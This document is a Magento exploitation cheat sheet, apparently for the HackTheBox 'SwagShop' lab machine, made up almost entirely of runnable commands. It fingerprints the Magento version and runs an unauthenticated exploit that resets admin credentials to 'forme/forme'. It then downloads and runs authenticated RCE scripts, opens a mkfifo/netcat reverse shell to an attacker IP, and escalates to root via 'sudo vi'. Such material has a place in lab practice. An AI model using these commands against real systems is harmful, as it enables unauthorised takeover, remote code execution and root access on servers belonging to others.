# Magento Exploitation – One-Click Cheatsheet

```bash
#############################################
# 1️⃣ Install MageScan & Check Version
#############################################
wget https://github.com/steverobbins/magescan/releases/download/v1.12.9/magescan.phar
chmod +x magescan.phar
mv magescan.phar /usr/local/bin/magescan
magescan scan:version http://swagshop.htb/

#############################################
# 2️⃣ Exploit #1 – Change Admin creds (37977.py)
#############################################
# Unauthenticated admin creds modification if vulnerable (<1.9.x)
searchsploit -m 37977.py
python3 37977.py http://swagshop.htb/index.php

# Default creds after exploit:
# username: forme
# password: forme

#############################################
# 3️⃣ Exploit #2 – Authenticated RCE (<1.9.0)
#############################################
# Use admin creds to gain RCE
method 1:
wget https://raw.githubusercontent.com/0xBruno/MagentoCE_1.9.0.1_Authenticated_RCE/main/exploit.py
python3 exploit.py http://swagshop.htb/index.php/admin
method 2 (needs some modificaitons):python3 37811.py http://swagshop.htb/index.php/admin/ "whoami"

#############################################
# 4️⃣ Reverse Shell (replace with your IP)
#############################################
nc -nvlp 4444
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc [IP] 4444 > /tmp/f

# Upgrade to fully interactive TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
^Z
stty raw -echo; fg
export TERM=xterm

#############################################
# 5️⃣ Privilege Escalation – via sudo vi
#############################################
sudo -l
sudo /usr/bin/vi /var/www/html/ -c '!/bin/bash'
